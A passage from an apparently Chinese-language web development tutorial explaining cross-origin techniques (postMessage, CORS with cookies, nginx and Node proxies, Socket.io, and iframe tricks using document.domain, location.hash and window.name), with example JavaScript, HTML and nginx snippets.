<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接收domain1的数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain1 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line"><span class="undefined">            data.number = 16;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 处理后再发回domain1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain1.com'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>); <span class="comment">// false默认为冒泡，true表示捕获</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="跨域资源共享（CORS）"><a href="#跨域资源共享（CORS）" class="headerlink" title="跨域资源共享（CORS）"></a>跨域资源共享（CORS）</h4><blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">阮一峰 cors</a></p>
</blockquote>
<p>普通跨域请求：只服务端设置 <code>Access-Control-Allow-Origin</code> 即可，前端无须设置，若要带cookie请求：前后端都需要设置。<br>目前，所有浏览器都支持该功能(IE8+：IE8/9需要使用 <code>XDomainRequest</code> 对象来支持CORS）)，CORS也已经成为主流的跨域解决方案。</p>
<ol>
<li><p>前端设置<br>1.）原生ajax</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p> 示例代码：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'http://www.domain2.com:8080/login'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhr.send(<span class="string">'user=admin'</span>);</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>2.）jQuery ajax</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    ...</span><br><span class="line">   xhrFields: &#123;</span><br><span class="line">       withCredentials: <span class="literal">true</span>    <span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">   &#125;,</span><br><span class="line">   crossDomain: <span class="literal">true</span>,   <span class="comment">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>3.）Vue ajax</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// axios</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// vue-resource</span></span><br><span class="line">Vue.http.options.credentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>服务端设置<br>若后端设置成功，前端浏览器控制台则不会出现跨域报错信息，反之，说明没设成功。<br>1.）Java后台</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 导入包：import javax.servlet.http.HttpServletResponse;</span></span><br><span class="line"><span class="comment"> * 接口参数中定义：HttpServletResponse response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许跨域访问的域名：若有端口需写全（协议+域名+端口），若没有端口末尾不用加'/'</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"http://www.domain1.com"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许前端带认证cookie：启用此项后，上面的域名不能为'*'，必须指定具体的域名，否则浏览器会提示</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Credentials"</span>, <span class="string">"true"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 提示OPTIONS预检时，后端需要设置的两个常用自定义头</span></span><br><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"Content-Type,X-Requested-With"</span>);</span><br></pre></td></tr></table></figure>
<p>2.） Node.js</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> postData = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据块接收中</span></span><br><span class="line">    req.addListener(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">        postData += chunk;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据接收完毕</span></span><br><span class="line">    req.addListener(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        postData = qs.parse(postData);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跨域后台设置</span></span><br><span class="line">        res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">            <span class="string">'Access-Control-Allow-Credentials'</span>: <span class="string">'true'</span>,     <span class="comment">// 后端允许发送Cookie</span></span><br><span class="line">            <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'http://www.domain1.com'</span>,    <span class="comment">// 允许访问的域（协议+域名+端口）</span></span><br><span class="line">            <span class="comment">/* </span></span><br><span class="line"><span class="comment">             * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)，</span></span><br><span class="line"><span class="comment">             * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="string">'Set-Cookie'</span>: <span class="string">'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'</span>  <span class="comment">// HttpOnly的作用是让js无法读取cookie</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        res.write(<span class="built_in">JSON</span>.stringify(postData));</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="nginx代理跨域"><a href="#nginx代理跨域" class="headerlink" title="nginx代理跨域"></a>nginx代理跨域</h4><ol>
<li><p>nginx配置解决iconfont跨域<br>浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>nginx反向代理接口跨域<br>跨域原理： 同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨越问题。<br>实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。</p>
<p>1.) nginx具体配置：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#proxy服务器</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  www.domain1.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass   http://www.domain2.com:8080;  <span class="comment">#反向代理</span></span><br><span class="line">        proxy_cookie_domain www.domain2.com www.domain1.com; <span class="comment">#修改cookie里域名</span></span><br><span class="line">        index  index.html index.htm;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用</span></span><br><span class="line">        add_header Access-Control-Allow-Origin http://www.domain1.com;  <span class="comment">#当前端只跨域不带cookie时，可为*</span></span><br><span class="line">        add_header Access-Control-Allow-Credentials <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.) 前端代码示例：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端开关：浏览器是否读写cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问nginx中的代理服务器</span></span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://www.domain1.com:81/?user=admin'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>3.) Nodejs后台示例：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer();</span><br><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> params = qs.parse(req.url.substring(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向前台写cookie</span></span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Set-Cookie'</span>: <span class="string">'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'</span>   <span class="comment">// HttpOnly:脚本无法读取</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.write(<span class="built_in">JSON</span>.stringify(params));</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="nodejs中间件代理跨域"><a href="#nodejs中间件代理跨域" class="headerlink" title="nodejs中间件代理跨域"></a>nodejs中间件代理跨域</h4><p>node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。</p>
<h4 id="WebSocket协议跨域"><a href="#WebSocket协议跨域" class="headerlink" title="WebSocket协议跨域"></a>WebSocket协议跨域</h4><p><code>WebSocket protocol</code> 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。<br>原生 <code>WebSocket API</code> 使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。</p>
<ol>
<li><p>前端设置：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>user input：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./socket.io.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> socket = io(<span class="string">'http://www.domain2.com:8080'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 连接成功处理</span></span></span><br><span class="line"><span class="javascript">socket.on(<span class="string">'connect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端消息</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'data from server: ---&gt; '</span> + msg); </span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听服务端关闭</span></span></span><br><span class="line"><span class="javascript">    socket.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'Server socket has closed.'</span>); </span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>)[<span class="number">0</span>].onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    socket.send(<span class="keyword">this</span>.value);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Nodejs socket后台：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> socket = <span class="built_in">require</span>(<span class="string">'socket.io'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启http服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">'Content-type'</span>: <span class="string">'text/html'</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="string">'8080'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server is running at port 8080...'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听socket连接</span></span><br><span class="line">socket.listen(server).on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 接收信息</span></span><br><span class="line">    client.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">        client.send(<span class="string">'hello：'</span> + msg);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'data from client: ---&gt; '</span> + msg);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开处理</span></span><br><span class="line">    client.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Client socket has closed.'</span>); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="document-domain-iframe跨域"><a href="#document-domain-iframe跨域" class="headerlink" title="document.domain + iframe跨域"></a>document.domain + iframe跨域</h4><p>此方案仅限主域相同，子域不同的跨域应用场景。</p>
<p>实现原理：两个页面都通过js强制设置 <code>document.domain</code> 为基础主域，就实现了同域。</p>
<ol>
<li><p>父窗口：(<a href="http://www.domain.com/a.html" target="_blank" rel="noopener">http://www.domain.com/a.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://child.domain.com/b.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> user = <span class="string">'admin'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>子窗口：(<a href="http://child.domain.com/b.html" target="_blank" rel="noopener">http://child.domain.com/b.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取父窗口中变量</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">'get js data from parent ---&gt; '</span> + <span class="built_in">window</span>.parent.user);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="location-hash-iframe"><a href="#location-hash-iframe" class="headerlink" title="location.hash + iframe"></a>location.hash + iframe</h4><p>实现原理： a与b跨域相互通信，通过中间页c来实现。<br>三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。</p>
<p>具体实现：A域：a.html -&gt; B域：b.html -&gt; A域：c.html，a与b不同域只能通过hash值单向通信，b与c也不同域也只能单向通信，但c与a同域，所以c可通过parent.parent访问a页面所有对象。</p>
<ol>
<li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 向b.html传hash值</span></span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        iframe.src = iframe.src + <span class="string">'#user=admin'</span>;</span></span><br><span class="line"><span class="undefined">    &#125;, 1000);</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">// 开放给同域c.html的回调方法</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">onCallback</span>(<span class="params">res</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from c.html ---&gt; '</span> + res);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain1.com/c.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听a.html传来的hash值，再传给c.html</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">        iframe.src = iframe.src + location.hash;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>c.html：(<a href="http://www.domain1.com/c.html" target="_blank" rel="noopener">http://www.domain1.com/c.html</a>)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听b.html传来的hash值</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 再通过操作同域a.html的js回调，将结果传回</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.parent.parent.onCallback(<span class="string">'hello: '</span> + location.hash.replace(<span class="string">'#user='</span>, <span class="string">''</span>));</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="window-name-iframe跨域"><a href="#window-name-iframe跨域" class="headerlink" title="window.name + iframe跨域"></a>window.name + iframe跨域</h4><p><code>window.name</code> 属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。</p>
<ol>
<li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p>
